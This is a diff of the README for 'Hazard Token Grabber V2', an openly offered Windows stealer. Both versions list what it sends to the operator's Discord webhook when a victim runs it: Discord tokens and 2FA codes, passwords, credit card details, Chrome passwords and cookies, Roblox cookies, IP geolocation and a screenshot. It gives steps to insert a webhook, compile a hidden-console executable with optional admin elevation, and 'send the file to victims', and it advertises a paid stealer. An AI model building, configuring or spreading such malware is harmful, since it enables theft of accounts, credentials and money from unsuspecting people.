@@ -8,56 +8,45 @@
 #### Hazard-Token-Grabber-V2 was made by
 Love ❌ code ✅
 
-## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Star This Repository If You Liked Hazard Token Grabber V2!
-
-No this software will not be undetected by av or steal more, this is a free one and if you want a better stealer join [cheataway](https://cheataway.com/) and order one
+## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟 Star this Repository if you enjoy Hazard Stealer V2!
+**NOTE:** This is a free software. It will not be undetected from antivirus software, or have custom features. Remember, this is 100% free. If you want a better one, join [CheatAway](https://cheataway.com/) and purchase one.
 
 ---
 
-#### upon running the file you will get the following sent to your webhook:
- -  Username
- -  ComputerName
- -  Windows Product Key
- -  IP
- -  City
- -  Region
- -  Country
- -  Google Maps Location
- -  Screenshot of their pc
- -  Roblox Cookies
- -  All Their Valid Discord Tokens (bypasses betterdiscord's anti-token-grab-protector)
- -  Discord 2fa codes (if they have 2fa enabled ofc)
- -  Password For Discord (You get Their Password if They Update it)
- -  Their Whole Credit Card (number, cvc, date, (if They Put one in))
- -  All Their Chrome Passwords And Cookies
-> Webhook looks like this:
-
+#### When someone executes the file, the following info will be sent to you:
+-  User Name.
+-  Computer Name.
+-  Windows Product Key & Build Info.
+-  IP & Geolocation. (Country, City, Google Maps Location)
+-  A screenshot taken when they ran the file.
+-  Roblox Cookies.
+-  All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
+-  Discord 2FA Codes for accounts with 2FA enabled.
+-  Their Passwords & Credit Cards for Discord. (updates when they change it)
+-  All Passwords and Cookies from the Chrome Browser.
+> The webhook notification looks like this:
 <p align="left"><img src="https://user-images.githubusercontent.com/80375661/159514536-d8249923-adbe-4b9e-a187-6b028941f4a7.png"</p>
-
+ 
 ### 📁・Setting up Hazard Token Grabber.V2
-1. Start off by installing [python](https://www.python.org/) ofc
-2. open main.py with any code editor of your choice and paste your webhook on line 7 (or replace "WEBHOOK_HERE" with the webhook)
-3. run the `setup.bat` and let it do it's things
-4. a windows should popup asking for exe name and after you fixed all of that you should have your exe
-5. send exe to your victims 😈
-
+1. Install python if you have not already. [(Link Here)](https://www.python.org/)
+2. Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
+3. Double Click `setup.bat` and allow it to finish.
+4. A Window will open prompting for a name. Put something in such as "Token_Logger.exe" (You can always rename the file later)
+5. Send the file to victims. 😈
+ 
 ### ⚙・Manually Compiling Source Code
-If you dont feel like running build-exe.bat and compiling it like that you can
-Start of by opening a cmd in your directory and type:
-```
-pyinstaller --onefile --clean --noconsole main.py
-```
-replace main.py with the file name if you changed it.
-3 folders and 1 file will be created, you can delete them all except for the dist folder
-go into the dist folder and there is your exe ready to be sent to victims!
-
+If you do not want to use the batch file, you can follow this guide:
+1. Open command prompt in the same directory as the .py file.
+2. Type `pip install -r requirements.txt` (To install the modules)
+3. Type: `pyinstaller --clean --onefile -w main.py`, you will see a lot of text popping up. Ignore it and wait.
+4. After it says its finishing, you can find the EXE file in the dist directory, located in the project root!
+ 
 ### 💾・ More options
 Add these into the command when creating the exe if you want
-
-|    Pyinstaller Options 		|
-| ------------------------------------ 	|
-| `-n name` Name that the exe will have (default is the .py file)	|
-| `-i icon.ico` Icon that the exe will have (do `-i NONE` for normal executable look)	|
-| `--clean` Clean PyInstaller cache and remove temporary files before building	|
-| `--uac-admin` Requests admin privileges upon running the exe |
-| `--hidden-import MODULENAME` Name an import not visible in the code of the script. Can be used multiple times |
+|    PyInstaller Options         |
+| ------------------------------------     |
+| `-n name` The name of the compiled EXE (Defaults to the name of the original .py file)    |
+| `-i icon.ico` The icon. You can specify a directory to an icon file, or do NONE for a default EXE icon.    |
+| `--clean` Removes all temporary files so you only have what you need.    |
+| `--uac-admin` Modified the MANIFEST so that it will request UAC permissions upon running. |
+| `--hidden-import MODULENAME` Adds a module without it being present in the script. |
